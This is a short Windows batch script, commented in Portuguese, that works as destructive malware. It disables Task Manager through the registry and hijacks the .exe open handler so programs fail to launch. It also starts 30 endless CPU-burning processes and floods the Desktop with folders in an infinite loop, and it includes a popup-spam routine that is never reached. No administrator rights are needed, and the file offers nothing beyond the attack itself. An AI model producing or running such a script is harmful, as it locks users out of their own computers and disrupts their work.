@echo off
color 4f
title SISTEMA
mode con cols=15 lines=2

setlocal enabledelayedexpansion

:: --- 1. DESABILITA CTRL+ALT+DEL (sem admin) ----------------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul

:: --- 2. TRAVA TODA APLICAÇÃO .EXE  -------------------------
:: Substituir a abertura de qualquer .exe por um loop de erro
reg add "HKCU\Software\Classes\exefile\shell\open\command" /ve /t REG_SZ /d "cmd.exe /c echo SISTEMA CORROMPIDO & pause & exit" /f >nul

:: --- 3. SOBRECARGA DE CPU (sem admin) ----------------------
for /l %%i in (1,1,30) do start "" cmd.exe /c "for /l %%k in () do echo off>nul"

:: --- 4. CRIA MILHARES DE PASTAS NA ÁREA DE TRABALHO --------
:dsp
set desk=%userprofile%\Desktop
for /l %%x in (1,1,2000) do mkdir "%desk%\ERRO_%%x_!random!!random!" >nul 2>&1
goto dsp

:: --- 5. LOOP INFINITO DE JANELAS DE ERRO -------------------
:errloop
start mshta "javascript:confirm('ERRO CRÍTICO!');close();" 2>nul
timeout /t 1 /nobreak >nul
goto errloop